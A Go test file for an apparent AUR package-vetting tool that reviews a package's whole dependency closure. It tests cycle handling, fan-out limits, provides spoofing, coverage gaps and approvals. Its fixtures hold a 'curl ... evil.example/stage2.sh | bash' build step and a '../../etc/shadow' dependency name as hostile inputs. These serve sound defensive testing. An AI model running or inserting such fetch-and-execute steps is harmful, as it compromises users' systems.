// internal/gate/closure_test.go
//
// The load-bearing assertion in this file is
// TestClosureReviewsTheDependencyNobodyAskedAbout: reviewing only the named
// package reports clean while the closure reports the critical. Everything else
// exists to keep that assertion honest -- a closure that cannot terminate on a
// cycle, cannot bound a hostile fan-out, or lets a `provides` entry stand in for
// an identity is a closure review that reports clean for a different reason.
package gate

import (
	"context"
	"errors"
	"fmt"
	"os"
	"path/filepath"
	"sort"
	"strings"
	"testing"

	"github.com/lookatitude/aurvet/internal/finding"
	"github.com/lookatitude/aurvet/internal/helper"
	"github.com/lookatitude/aurvet/internal/pkgmeta"
)

// --- fixtures ---------------------------------------------------------------

// recipe is one package's on-disk recipe in a fake helper cache.
type recipe struct {
	pkgbuild string
	srcinfo  string
}

// clones writes a cache of pkgbase-keyed clone directories and returns an
// os.Root over the parent plus a RecipeSource keyed the same way.
func clones(t *testing.T, set map[string]recipe) (*os.Root, mapSource) {
	t.Helper()
	base := t.TempDir()
	src := mapSource{}
	for name, r := range set {
		dir := filepath.Join(base, "cache", name)
		if err := os.MkdirAll(dir, 0o755); err != nil {
			t.Fatal(err)
		}
		if r.pkgbuild != "" {
			if err := os.WriteFile(filepath.Join(dir, "PKGBUILD"), []byte(r.pkgbuild), 0o644); err != nil {
				t.Fatal(err)
			}
		}
		if r.srcinfo != "" {
			if err := os.WriteFile(filepath.Join(dir, ".SRCINFO"), []byte(r.srcinfo), 0o644); err != nil {
				t.Fatal(err)
			}
		}
		src[name] = filepath.ToSlash(filepath.Join("cache", name))
	}
	root, err := os.OpenRoot(base)
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { root.Close() })
	return root, src
}

type mapSource map[string]string

func (m mapSource) Recipe(pkgbase string) (string, bool) {
	d, ok := m[pkgbase]
	return d, ok
}

// fakeResolver is the AUR name->pkgbase seam. Err makes every lookup fail,
// which is the "network is down" case and must never read as "not in the AUR".
type fakeResolver struct {
	bases map[string]string
	err   error
}

func (f *fakeResolver) Bases(_ context.Context, names []string) (map[string]string, error) {
	if f.err != nil {
		return nil, f.err
	}
	out := map[string]string{}
	for _, n := range names {
		if b, ok := f.bases[n]; ok {
			out[n] = b
		}
	}
	return out, nil
}

// benign is an unremarkable recipe: nothing in it trips a rule. Its only sin in
// the closure test is the dependency it names.
func benign(name string, deps ...string) recipe {
	var d strings.Builder
	for _, dep := range deps {
		fmt.Fprintf(&d, "'%s' ", dep)
	}
	pkg := fmt.Sprintf(`# Maintainer: someone <someone@example.com>
pkgname=%s
pkgver=1.0.0
pkgrel=1
arch=('x86_64')
url="https://example.org/%s"
license=('MIT')
depends=(%s)
source=("https://github.com/example/%s/releases/download/v${pkgver}/%s.tar.gz")
sha256sums=('7d3c0f9b2a1e4d5c6b7a8f9e0d1c2b3a4f5e6d7c8b9a0f1e2d3c4b5a6f7e8d9c')
package() {
  install -Dm755 "$srcdir/%s" "$pkgdir/usr/bin/%s"
}
`, name, name, strings.TrimSpace(d.String()), name, name, name, name)

	var si strings.Builder
	fmt.Fprintf(&si, "pkgbase = %s\n\tpkgver = 1.0.0\n\tpkgrel = 1\n\tarch = x86_64\n", name)
	for _, dep := range deps {
		fmt.Fprintf(&si, "\tdepends = %s\n", dep)
	}
	fmt.Fprintf(&si, "\npkgname = %s\n", name)
	return recipe{pkgbuild: pkg, srcinfo: si.String()}
}

// malicious is the payload: a recipe that fetches and executes code at build
// time, which internal/check rates critical.
func malicious(name string) recipe {
	r := benign(name)
	r.pkgbuild = strings.Replace(r.pkgbuild,
		`package() {`,
		"build() {\n  curl -s https://evil.example/stage2.sh | bash\n}\npackage() {",
		1)
	return r
}

// repoOnly is a RepoSet holding the given names as real repository packages.
func repoOnly(names ...string) RepoSet {
	s := RepoSet{Names: map[string]bool{}, Loaded: true}
	for _, n := range names {
		s.Names[n] = true
	}
	return s
}

func keys(c Closure) []string {
	out := make([]string, 0, len(c.Nodes))
	for _, n := range c.Nodes {
		out = append(out, n.Key)
	}
	sort.Strings(out)
	return out
}

func node(t *testing.T, c Closure, key string) Node {
	t.Helper()
	n, ok := c.Node(key)
	if !ok {
		t.Fatalf("no node %q in closure; have %v", key, keys(c))
	}
	return n
}

func hasGap(c Closure, rule string) bool {
	for _, g := range c.Result().Gaps {
		if g.RuleID == rule {
			return true
		}
	}
	return false
}

func gapReasons(c Closure) string {
	var b strings.Builder
	for _, g := range c.Result().Gaps {
		fmt.Fprintf(&b, "\n  [%s] %s: %s", g.RuleID, g.Subject, g.Reason)
	}
	return b.String()
}

// --- the reason this file exists --------------------------------------------

// TestClosureReviewsTheDependencyNobodyAskedAbout is the justification for the
// whole task. The user asks for a package that is clean by every rule; its only
// dependency executes a downloaded script at build time. A gate that reviews
// the named package reports clean, and that is a documented bypass.
func TestClosureReviewsTheDependencyNobodyAskedAbout(t *testing.T) {
	root, src := clones(t, map[string]recipe{
		"innocuous":     benign("innocuous", "helpful-lib", "gtk3"),
		"helpful-lib":   malicious("helpful-lib"),
		"unrelated-pkg": malicious("unrelated-pkg"), // never referenced; must not appear
	})
	cfg := ClosureConfig{
		Source: src,
		Repo:   repoOnly("gtk3"),
		Local:  map[string]string{"innocuous": "innocuous", "helpful-lib": "helpful-lib"},
	}
	c := ReviewClosure(context.Background(), root, ClosureRequest{PkgBase: "innocuous"}, cfg)

	// 1. The named package on its own is clean. If this fails the test proves
	// nothing: the closure would be reporting the subject's own findings.
	subject := node(t, c, "innocuous")
	if got := subject.Result.MaxSeverity(); got != finding.SevInfo || len(subject.Result.Findings) != 0 {
		t.Fatalf("the named package is not clean on its own (%s, %d findings); this test cannot prove anything",
			got, len(subject.Result.Findings))
	}

	// 2. The closure is not.
	if got := c.Result().MaxSeverity(); got != finding.SevCritical {
		t.Errorf("closure MaxSeverity = %s, want critical -- the malicious dependency was not reviewed%s", got, gapReasons(c))
	}
	dep := node(t, c, "helpful-lib")
	if dep.Kind != KindAUR {
		t.Errorf("helpful-lib kind = %s, want %s", dep.Kind, KindAUR)
	}
	if !dep.Reviewed {
		t.Error("helpful-lib was not reviewed")
	}
	if dep.Result.MaxSeverity() != finding.SevCritical {
		t.Errorf("helpful-lib findings = %v, want a critical", ruleList(dep.Result))
	}

	// 3. A repository dependency is not recursed into, and an unreferenced
	// package in the same cache is not dragged in.
	if got := node(t, c, "gtk3").Kind; got != KindRepo {
		t.Errorf("gtk3 kind = %s, want %s", got, KindRepo)
	}
	if _, ok := c.Node("unrelated-pkg"); ok {
		t.Error("an unreferenced clone entered the closure")
	}

	// 4. The tree is printed and names the malicious node under the one the
	// user asked for.
	tree := strings.Join(c.Tree(), "\n")
	if !strings.Contains(tree, "innocuous") || !strings.Contains(tree, "helpful-lib") {
		t.Errorf("tree does not show the closure:\n%s", tree)
	}
	// 5. Output leads with what must be acted on, not with the tree.
	lines := c.Lines()
	if len(lines) == 0 || !strings.Contains(strings.Join(lines[:min(4, len(lines))], "\n"), "helpful-lib") {
		t.Errorf("review output does not lead with the reviewable set:\n%s", strings.Join(lines, "\n"))
	}
}

func ruleList(r finding.Result) []string {
	out := make([]string, 0, len(r.Findings))
	for _, f := range r.Findings {
		out = append(out, f.RuleID+"/"+f.Severity.String())
	}
	return out
}

// --- provides cannot silence a review ---------------------------------------

// TestProvidesCannotSilenceAReview pins the identity rule. A hostile AUR package
// declaring provides=('openssl') -- and conflicts/replaces to match -- is still
// an AUR package and is still reviewed. Identity comes from the repository the
// package lives in, never from what it claims to provide.
func TestProvidesCannotSilenceAReview(t *testing.T) {
	evil := malicious("openssl-turbo")
	evil.srcinfo = strings.Replace(evil.srcinfo, "\tarch = x86_64\n",
		"\tarch = x86_64\n\tprovides = openssl\n\tconflicts = openssl\n\treplaces = openssl\n", 1)
	evil.pkgbuild = strings.Replace(evil.pkgbuild, "license=('MIT')\n",
		"license=('MIT')\nprovides=('openssl')\nconflicts=('openssl')\nreplaces=('openssl')\n", 1)

	root, src := clones(t, map[string]recipe{
		"innocuous":     benign("innocuous", "openssl-turbo"),
		"openssl-turbo": evil,
	})
	c := ReviewClosure(context.Background(), root, ClosureRequest{PkgBase: "innocuous"}, ClosureConfig{
		Source: src,
		// openssl IS a real repository package. The AUR package merely claims
		// to be it.
		Repo:  repoOnly("openssl"),
		Local: map[string]string{"innocuous": "innocuous", "openssl-turbo": "openssl-turbo"},
	})

	n := node(t, c, "openssl-turbo")
	if n.Kind != KindAUR {
		t.Fatalf("openssl-turbo kind = %s, want %s: a provides entry was allowed to decide identity", n.Kind, KindAUR)
	}
	if !n.Reviewed || n.Result.MaxSeverity() != finding.SevCritical {
		t.Errorf("openssl-turbo reviewed=%v findings=%v; a provides match silenced the review", n.Reviewed, ruleList(n.Result))
	}
	if c.Result().MaxSeverity() != finding.SevCritical {
		t.Errorf("closure severity = %s, want critical", c.Result().MaxSeverity())
	}
}

// TestRepoProvidesSatisfiesAVirtualName is the other direction: a virtual name
// that only the SIGNED repository metadata provides is repo-satisfied, because
// that claim comes from a package pacman's signature chain covers.
func TestRepoProvidesSatisfiesAVirtualName(t *testing.T) {
	root, src := clones(t, map[string]recipe{
		"innocuous": benign("innocuous", "java-runtime"),
	})
	repo := repoOnly("jdk-openjdk")
	repo.Providers = map[string][]string{"java-runtime": {"jdk-openjdk"}}

	c := ReviewClosure(context.Background(), root, ClosureRequest{PkgBase: "innocuous"}, ClosureConfig{
		Source: src, Repo: repo, Local: map[string]string{"innocuous": "innocuous"},
	})
	n := node(t, c, "java-runtime")
	if n.Kind != KindRepoProvided {
		t.Errorf("java-runtime kind = %s, want %s", n.Kind, KindRepoProvided)
	}
	if hasGap(c, RuleDepUnresolved) {
		t.Errorf("a repo-provided virtual name gapped as unresolvable%s", gapReasons(c))
	}
}

// TestAURPackageOutranksARepoProvides: when a dependency name is BOTH an AUR
// package and a virtual name some repository package provides, it is reviewed.
// The opposite precedence is the skip the brief warns about.
func TestAURPackageOutranksARepoProvides(t *testing.T) {
	root, src := clones(t, map[string]recipe{
		"innocuous": benign("innocuous", "shady"),
		"shady":     malicious("shady"),
	})
	repo := repoOnly("some-repo-pkg")
	repo.Providers = map[string][]string{"shady": {"some-repo-pkg"}}

	c := ReviewClosure(context.Background(), root, ClosureRequest{PkgBase: "innocuous"}, ClosureConfig{
		Source: src, Repo: repo,
		Local: map[string]string{"innocuous": "innocuous", "shady": "shady"},
	})
	if got := node(t, c, "shady").Kind; got != KindAUR {
		t.Fatalf("shady kind = %s, want %s: a provides entry outranked a real AUR recipe", got, KindAUR)
	}
	if c.Result().MaxSeverity() != finding.SevCritical {
		t.Errorf("closure severity = %s, want critical", c.Result().MaxSeverity())
	}
}

// --- termination -------------------------------------------------------------

// TestCycleTerminates. AUR dependency graphs contain cycles; an infinite tree
// print is not a review.
func TestCycleTerminates(t *testing.T) {
	root, src := clones(t, map[string]recipe{
		"a": benign("a", "b"),
		"b": benign("b", "c"),
		"c": benign("c", "a"),
	})
	c := ReviewClosure(context.Background(), root, ClosureRequest{PkgBase: "a"}, ClosureConfig{
		Source: src, Repo: repoOnly(),
		Local: map[string]string{"a": "a", "b": "b", "c": "c"},
	})
	if got := len(c.Nodes); got != 3 {
		t.Fatalf("nodes = %d (%v), want 3", got, keys(c))
	}
	if c.Counts().CyclesCut == 0 {
		t.Error("the cycle was not recorded as cut")
	}
	if !hasGap(c, RuleCycle) {
		t.Errorf("a cut cycle is a coverage gap (INV-9)%s", gapReasons(c))
	}
	if c.Result().Complete() {
		t.Error("a closure with a cut cycle reported complete coverage")
	}
	tree := c.Tree()
	if len(tree) > 16 {
		t.Fatalf("tree did not terminate compactly (%d lines):\n%s", len(tree), strings.Join(tree, "\n"))
	}
	if !strings.Contains(strings.Join(tree, "\n"), "cycle") {
		t.Errorf("tree does not mark the cycle:\n%s", strings.Join(tree, "\n"))
	}
}

// TestSelfDependencyTerminatesAndIsNotACut. A recipe naming one of its own
// output packages is what a split package looks like -- flutter, 17 packages,
// declares five such edges on the reference system. It must terminate, and it
// must NOT manufacture a coverage gap: nothing is beyond that edge, because the
// node it points at is the node being expanded.
func TestSelfDependencyTerminatesAndIsNotACut(t *testing.T) {
	root, src := clones(t, map[string]recipe{"a": benign("a", "a")})
	c := ReviewClosure(context.Background(), root, ClosureRequest{PkgBase: "a"}, ClosureConfig{
		Source: src, Repo: repoOnly(), Local: map[string]string{"a": "a"},
	})
	if len(c.Nodes) != 1 {
		t.Fatalf("nodes = %v, want just a", keys(c))
	}
	deps := node(t, c, "a").Deps
	if len(deps) != 1 || !deps[0].Self {
		t.Fatalf("edges = %+v, want one self edge", deps)
	}
	if c.Counts().CyclesCut != 0 {
		t.Error("a self edge was counted as a cut cycle")
	}
	if !c.Result().Complete() {
		t.Errorf("a self edge manufactured a coverage gap%s", gapReasons(c))
	}
}

// TestSplitSiblingDependencyIsNotACut is the shape that actually occurs: one
// base's pkgname depending on another pkgname of the SAME base.
func TestSplitSiblingDependencyIsNotACut(t *testing.T) {
	base := benign("libfoo", "libfoo-common")
	base.srcinfo = "pkgbase = libfoo\n\tpkgver = 1.0.0\n\tpkgrel = 1\n\tarch = x86_64\n\tdepends = libfoo-common\n\npkgname = libfoo\n\npkgname = libfoo-common\n"
	root, src := clones(t, map[string]recipe{
		"a":      benign("a", "libfoo"),
		"libfoo": base,
	})
	c := ReviewClosure(context.Background(), root, ClosureRequest{PkgBase: "a"}, ClosureConfig{
		Source: src, Repo: repoOnly(),
		Local: map[string]string{"a": "a", "libfoo": "libfoo", "libfoo-common": "libfoo"},
	})
	if c.Counts().CyclesCut != 0 {
		t.Errorf("a split sibling dependency was reported as a cut cycle%s", gapReasons(c))
	}
	if !c.Result().Complete() {
		t.Errorf("a split sibling dependency manufactured a coverage gap%s", gapReasons(c))
	}
}

// TestFanOutIsBoundedAndGaps. A hostile .SRCINFO can declare 10,000 deps. A
// silently truncated closure is a reviewed-looking closure that was not
// reviewed.
func TestFanOutIsBoundedAndGaps(t *testing.T) {
	deps := make([]string, 0, 50)
	for i := 0; i < 50; i++ {
		deps = append(deps, fmt.Sprintf("dep%02d", i))
	}
	root, src := clones(t, map[string]recipe{"a": benign("a", deps...)})
	c := ReviewClosure(context.Background(), root, ClosureRequest{PkgBase: "a"}, ClosureConfig{
		Source: src, Repo: repoOnly(), Local: map[string]string{"a": "a"},
		Limits: ClosureLimits{MaxDepsPerNode: 10},
	})
	if got := len(node(t, c, "a").Deps); got != 10 {
		t.Errorf("edges = %d, want the 10-dependency bound", got)
	}
	if !hasGap(c, RuleFanOut) {
		t.Errorf("a truncated dependency list did not gap%s", gapReasons(c))
	}
	if c.Result().Complete() {
		t.Error("a truncated closure reported complete coverage")
	}
}

// TestNodeBoundStopsTheWalk bounds the whole closure, not one node's list.
func TestNodeBoundStopsTheWalk(t *testing.T) {
	set := map[string]recipe{}
	local := map[string]string{}
	for i := 0; i < 12; i++ {
		name := fmt.Sprintf("n%02d", i)
		set[name] = benign(name, fmt.Sprintf("n%02d", i+1))
		local[name] = name
	}
	root, src := clones(t, set)
	c := ReviewClosure(context.Background(), root, ClosureRequest{PkgBase: "n00"}, ClosureConfig{
		Source: src, Repo: repoOnly(), Local: local,
		Limits: ClosureLimits{MaxNodes: 5},
	})
	if len(c.Nodes) > 5 {
		t.Errorf("nodes = %d, want at most the 5-node bound", len(c.Nodes))
	}
	if !hasGap(c, RuleTruncated) {
		t.Errorf("the node bound did not gap%s", gapReasons(c))
	}
}

// TestDepthBoundGaps: depth and node count are different bounds and a cycle
// needs both.
func TestDepthBoundGaps(t *testing.T) {
	set := map[string]recipe{}
	local := map[string]string{}
	for i := 0; i < 8; i++ {
		name := fmt.Sprintf("n%02d", i)
		set[name] = benign(name, fmt.Sprintf("n%02d", i+1))
		local[name] = name
	}
	root, src := clones(t, set)
	c := ReviewClosure(context.Background(), root, ClosureRequest{PkgBase: "n00"}, ClosureConfig{
		Source: src, Repo: repoOnly(), Local: local,
		Limits: ClosureLimits{MaxDepth: 2},
	})
	if got := c.Counts().MaxDepth; got > 2 {
		t.Errorf("depth = %d, want at most 2", got)
	}
	if !hasGap(c, RuleDepthBound) {
		t.Errorf("the depth bound did not gap%s", gapReasons(c))
	}
}

// --- gaps, not silence --------------------------------------------------------

// TestUnresolvableDepIsAGap. A dependency naming nothing that exists is not
// fine: it is something the review could not look at (INV-9).
func TestUnresolvableDepIsAGap(t *testing.T) {
	root, src := clones(t, map[string]recipe{"a": benign("a", "ghost-package")})
	c := ReviewClosure(context.Background(), root, ClosureRequest{PkgBase: "a"}, ClosureConfig{
		Source: src, Repo: repoOnly(), Local: map[string]string{"a": "a"},
		Resolver: &fakeResolver{bases: map[string]string{}},
	})
	if got := node(t, c, "ghost-package").Kind; got != KindUnresolved {
		t.Errorf("ghost-package kind = %s, want %s", got, KindUnresolved)
	}
	if !hasGap(c, RuleDepUnresolved) {
		t.Errorf("an unresolvable dependency did not gap%s", gapReasons(c))
	}
	if c.Result().Complete() {
		t.Error("a closure with an unreviewable node reported complete coverage")
	}
}

// TestVersionConstraintDoesNotHideADependency. `foo>=1.2` must resolve as foo;
// a constraint that makes a name unmatchable removes the node silently.
func TestVersionConstraintDoesNotHideADependency(t *testing.T) {
	root, src := clones(t, map[string]recipe{
		"a":    benign("a", "evil>=1.2", "gtk3<4.0"),
		"evil": malicious("evil"),
	})
	c := ReviewClosure(context.Background(), root, ClosureRequest{PkgBase: "a"}, ClosureConfig{
		Source: src, Repo: repoOnly("gtk3"),
		Local: map[string]string{"a": "a", "evil": "evil"},
	})
	if got := node(t, c, "evil").Kind; got != KindAUR {
		t.Fatalf("evil kind = %s, want %s: the version constraint hid it", got, KindAUR)
	}
	if got := node(t, c, "gtk3").Kind; got != KindRepo {
		t.Errorf("gtk3 kind = %s, want %s", got, KindRepo)
	}
	if c.Result().MaxSeverity() != finding.SevCritical {
		t.Error("the constrained dependency was not reviewed")
	}
}

// TestFailedAURLookupIsAGapNotAnAbsence. The network being down must never read
// as "these packages are not in the AUR", which would silently mark them
// unresolvable and move on.
func TestFailedAURLookupIsAGapNotAnAbsence(t *testing.T) {
	root, src := clones(t, map[string]recipe{"a": benign("a", "somedep")})
	c := ReviewClosure(context.Background(), root, ClosureRequest{PkgBase: "a"}, ClosureConfig{
		Source: src, Repo: repoOnly(), Local: map[string]string{"a": "a"},
		Resolver: &fakeResolver{err: errors.New("dial tcp: connection refused")},
	})
	if !hasGap(c, RuleLookupFailed) {
		t.Errorf("a failed AUR lookup did not gap%s", gapReasons(c))
	}
	if c.Result().Complete() {
		t.Error("a closure built with a failed lookup reported complete coverage")
	}
}

// TestOfflineClosureIsHonest. With no resolver the walk still runs from local
// clones and says what it could not check -- never a silent empty closure that
// reads as "no dependencies".
func TestOfflineClosureIsHonest(t *testing.T) {
	root, src := clones(t, map[string]recipe{
		"a": benign("a", "b", "unknown-dep"),
		"b": benign("b"),
	})
	c := ReviewClosure(context.Background(), root, ClosureRequest{PkgBase: "a"}, ClosureConfig{
		Source: src, Repo: repoOnly(), Local: map[string]string{"a": "a", "b": "b"},
		Resolver: nil,
	})
	if _, ok := c.Node("b"); !ok {
		t.Error("the offline walk did not use the local clone for b")
	}
	if !hasGap(c, RuleNoResolver) {
		t.Errorf("an offline run did not record that names could not be resolved against the AUR%s", gapReasons(c))
	}
}

// TestMissingRecipeIsAGap: an AUR node with no readable recipe cannot be
// reviewed, and its own dependencies are unknown.
func TestMissingRecipeIsAGap(t *testing.T) {
	root, src := clones(t, map[string]recipe{"a": benign("a", "b")})
	c := ReviewClosure(context.Background(), root, ClosureRequest{PkgBase: "a"}, ClosureConfig{
		Source: src, Repo: repoOnly(),
		Local:    map[string]string{"a": "a"},
		Resolver: &fakeResolver{bases: map[string]string{"b": "b"}},
	})
	n := node(t, c, "b")
	if n.Kind != KindAUR {
		t.Fatalf("b kind = %s, want %s", n.Kind, KindAUR)
	}
	if n.Reviewed {
		t.Error("a node with no recipe on disk was reported as reviewed")
	}
	if !hasGap(c, RuleRecipeUnavailable) {
		t.Errorf("an unreviewable AUR node did not gap%s", gapReasons(c))
	}
}

// TestUnloadedRepoIndexGapsAndDoesNotSilence: with no sync database, no name
// may be dismissed as repo-satisfied.
func TestUnloadedRepoIndexGapsAndDoesNotSilence(t *testing.T) {
	root, src := clones(t, map[string]recipe{"a": benign("a", "gtk3")})
	c := ReviewClosure(context.Background(), root, ClosureRequest{PkgBase: "a"}, ClosureConfig{
		Source: src, Repo: RepoSet{}, Local: map[string]string{"a": "a"},
	})
	if got := node(t, c, "gtk3").Kind; got == KindRepo {
		t.Error("a name was called repo-satisfied with no repository index loaded")
	}
	if !hasGap(c, RuleRepoIndexUnavailable) {
		t.Errorf("an unloaded repository index did not gap%s", gapReasons(c))
	}
}

// --- pkgbase keying -----------------------------------------------------------

// TestSplitPackageIsOneNode. 433 of 1409 installed packages are split. A closure
// keyed on pkgname prompts N times for one recipe; keyed on pkgbase it prompts
// once and the node records every pkgname that led to it.
func TestSplitPackageIsOneNode(t *testing.T) {
	base := benign("libfoo")
	base.srcinfo = "pkgbase = libfoo\n\tpkgver = 1.0.0\n\tpkgrel = 1\n\tarch = x86_64\n\npkgname = libfoo\n\npkgname = libfoo-docs\n"
	root, src := clones(t, map[string]recipe{
		"a":      benign("a", "libfoo", "libfoo-docs"),
		"libfoo": base,
	})
	c := ReviewClosure(context.Background(), root, ClosureRequest{PkgBase: "a"}, ClosureConfig{
		Source: src, Repo: repoOnly(),
		Local: map[string]string{"a": "a", "libfoo": "libfoo", "libfoo-docs": "libfoo"},
	})
	if len(c.Nodes) != 2 {
		t.Fatalf("nodes = %v, want a and libfoo only -- one recipe reviewed once", keys(c))
	}
	n := node(t, c, "libfoo")
	if len(n.Names) != 2 {
		t.Errorf("libfoo node names = %v, want both pkgnames that reached it", n.Names)
	}
	if n.PkgBase != "libfoo" {
		t.Errorf("node keyed on %q, want the pkgbase", n.PkgBase)
	}
}

// --- approvals ----------------------------------------------------------------

// TestApprovedNodeIsSilentAndChangedNodeIsNot wires the closure to the task-10
// store: an approved recipe is silent, and editing one byte re-prompts.
func TestApprovedNodeIsSilentAndChangedNodeIsNot(t *testing.T) {
	root, src := clones(t, map[string]recipe{
		"a":   benign("a", "dep"),
		"dep": malicious("dep"),
	})
	store := &Store{dir: filepath.Join(t.TempDir(), "approvals")}
	cfg := ClosureConfig{
		Source: src, Repo: repoOnly(),
		Local: map[string]string{"a": "a", "dep": "dep"},
		Store: store,
	}

	first := ReviewClosure(context.Background(), root, ClosureRequest{PkgBase: "a"}, cfg)
	depNode := node(t, first, "dep")
	if depNode.Approval.Status != StatusUnknown {
		t.Fatalf("dep status = %s, want %s", depNode.Approval.Status, StatusUnknown)
	}
	if len(first.Reviewable()) != 2 {
		t.Fatalf("reviewable = %d, want both nodes before any approval", len(first.Reviewable()))
	}

	// Approve exactly what was reviewed.
	for _, n := range first.Reviewable() {
		rec, err := DigestRecipe(root, RecipeRequest{PkgBase: n.PkgBase, Dir: n.Dir})
		if err != nil {
			t.Fatal(err)
		}
		if _, err := store.Approve(rec, ApproveOptions{By: "test"}); err != nil {
			t.Fatal(err)
		}
	}

	second := ReviewClosure(context.Background(), root, ClosureRequest{PkgBase: "a"}, cfg)
	if got := node(t, second, "dep").Approval.Status; got != StatusApproved {
		t.Errorf("dep status = %s, want %s", got, StatusApproved)
	}
	if len(second.Reviewable()) != 0 {
		t.Errorf("reviewable = %v, want silence for an unchanged approved closure", second.Reviewable())
	}
	if got := second.Result().MaxSeverity(); got != finding.SevInfo {
		t.Errorf("an approved closure still reported %s findings", got)
	}

	// Change one byte of the dependency's recipe.
	depDir := filepath.Join(root.Name(), "cache", "dep", "PKGBUILD")
	body, err := os.ReadFile(depDir)
	if err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(depDir, append(body, "# changed\n"...), 0o644); err != nil {
		t.Fatal(err)
	}
	third := ReviewClosure(context.Background(), root, ClosureRequest{PkgBase: "a"}, cfg)
	if got := node(t, third, "dep").Approval.Status; got != StatusChanged {
		t.Errorf("dep status = %s, want %s after a recipe edit", got, StatusChanged)
	}
	if got := third.Result().MaxSeverity(); got != finding.SevCritical {
		t.Errorf("a changed dependency recipe was not re-reviewed (severity %s)", got)
	}
}

// --- purity and limits ---------------------------------------------------------

// TestClosureIsDeterministic: same (root, cfg) -> same evidence (INV-4).
func TestClosureIsDeterministic(t *testing.T) {
	root, src := clones(t, map[string]recipe{
		"a": benign("a", "b", "c", "zz-repo"),
		"b": benign("b", "c"),
		"c": benign("c"),
	})
	cfg := ClosureConfig{
		Source: src, Repo: repoOnly("zz-repo"),
		Local: map[string]string{"a": "a", "b": "b", "c": "c"},
	}
	first := strings.Join(ReviewClosure(context.Background(), root, ClosureRequest{PkgBase: "a"}, cfg).Lines(), "\n")
	for i := 0; i < 5; i++ {
		again := strings.Join(ReviewClosure(context.Background(), root, ClosureRequest{PkgBase: "a"}, cfg).Lines(), "\n")
		if again != first {
			t.Fatalf("run %d differs:\n%s\n---\n%s", i, first, again)
		}
	}
}

// TestClosureStatesItsLimits (INV-6): a dependency resolved today may resolve
// differently tomorrow, and the report says so.
func TestClosureStatesItsLimits(t *testing.T) {
	root, src := clones(t, map[string]recipe{"a": benign("a")})
	c := ReviewClosure(context.Background(), root, ClosureRequest{PkgBase: "a"}, ClosureConfig{
		Source: src, Repo: repoOnly(), Local: map[string]string{"a": "a"},
	})
	if c.Limits == "" {
		t.Fatal("closure states no limits")
	}
	for _, want := range []string{"resolve"} {
		if !strings.Contains(c.Limits, want) {
			t.Errorf("limits do not mention %q: %s", want, c.Limits)
		}
	}
}

// TestRefusedPkgBaseNeverReachesAPath: an attacker-controlled dependency name is
// validated before it can become a directory or an identity.
func TestRefusedPkgBaseNeverReachesAPath(t *testing.T) {
	root, src := clones(t, map[string]recipe{"a": benign("a", "../../etc/shadow")})
	c := ReviewClosure(context.Background(), root, ClosureRequest{PkgBase: "a"}, ClosureConfig{
		Source: src, Repo: repoOnly(), Local: map[string]string{"a": "a"},
	})
	for _, n := range c.Nodes {
		if strings.Contains(n.Dir, "..") {
			t.Fatalf("node %q got directory %q", n.Key, n.Dir)
		}
	}
	if !hasGap(c, RulePkgBaseRefused) && !hasGap(c, RuleDepUnresolved) {
		t.Errorf("a hostile dependency name produced neither a refusal nor a gap%s", gapReasons(c))
	}
}

// TestBadSubjectIsAGapNotAPanic.
func TestBadSubjectIsAGapNotAPanic(t *testing.T) {
	root, src := clones(t, map[string]recipe{"a": benign("a")})
	c := ReviewClosure(context.Background(), root, ClosureRequest{PkgBase: "../evil"}, ClosureConfig{
		Source: src, Repo: repoOnly(),
	})
	if c.Result().Complete() {
		t.Error("a refused subject reported complete coverage")
	}
}

// --- the live measurement -------------------------------------------------------

// TestLiveClosure builds closures for real packages out of the reference
// system's helper cache. Offline: no resolver, so every dependency that is not a
// repository package and not another clone gaps, which is the honest offline
// answer and is what the receipt reports.
func TestLiveClosure(t *testing.T) {
	if os.Getenv("AURVET_LIVE_CLOSURE") != "1" {
		t.Skip("set AURVET_LIVE_CLOSURE=1 to measure against the live system")
	}
	root, err := os.OpenRoot("/")
	if err != nil {
		t.Fatal(err)
	}
	defer root.Close()

	home := os.Getenv("HOME")
	if home == "" {
		t.Skip("no HOME")
	}
	det := helper.Detect(root, helper.Config{CacheDirs: helper.DefaultCacheDirs([]string{home})})
	if !det.Covered() {
		t.Skip("no helper cache on this system")
	}
	src := CloneSource(det)
	local, localGaps := LocalNames(root, det, pkgmeta.Limits{})
	repo, repoGaps := SyncIndex("/var/lib/pacman/sync")

	var bases []string
	for _, c := range det.Caches {
		for _, cl := range c.Clones {
			bases = append(bases, cl.PkgBase)
		}
	}
	sort.Strings(bases)
	t.Logf("clones=%d local pkgname->pkgbase entries=%d (gaps %d); sync names=%d (gaps %d)",
		len(bases), len(local), len(localGaps), len(repo.Names), len(repoGaps))

	var totalNodes, totalAUR, totalRepo, totalUnres, totalCycles, deepest int
	unresolved := map[string]int{}
	for _, b := range bases {
		c := ReviewClosure(context.Background(), root, ClosureRequest{PkgBase: b}, ClosureConfig{
			Source: src, Repo: repo, Local: local,
		})
		n := c.Counts()
		totalNodes += n.Nodes
		totalAUR += n.AUR
		totalRepo += n.Repo + n.RepoProvided
		totalUnres += n.Unresolved
		totalCycles += n.CyclesCut
		if n.MaxDepth > deepest {
			deepest = n.MaxDepth
		}
		for _, nd := range c.Nodes {
			if nd.Kind == KindUnresolved {
				unresolved[nd.Key]++
			}
		}
		t.Logf("%-32s nodes=%3d aur=%2d repo=%3d unresolved=%2d cycles=%d depth=%d gaps=%d sev=%s",
			b, n.Nodes, n.AUR, n.Repo+n.RepoProvided, n.Unresolved, n.CyclesCut, n.MaxDepth,
			len(c.Result().Gaps), c.Result().MaxSeverity())
	}
	t.Logf("TOTAL over %d closures: nodes=%d aur=%d repo=%d unresolved=%d cycles-cut=%d deepest=%d",
		len(bases), totalNodes, totalAUR, totalRepo, totalUnres, totalCycles, deepest)

	// The unresolved names are the honest part of an offline run, and naming
	// them is how a reader judges whether the gaps are virtual provides (which a
	// provides index would close) or genuinely missing packages.
	names := make([]string, 0, len(unresolved))
	for n := range unresolved {
		names = append(names, n)
	}
	sort.Strings(names)
	for _, n := range names {
		t.Logf("unresolved: %-28s in %d closure(s)", n, unresolved[n])
	}
}
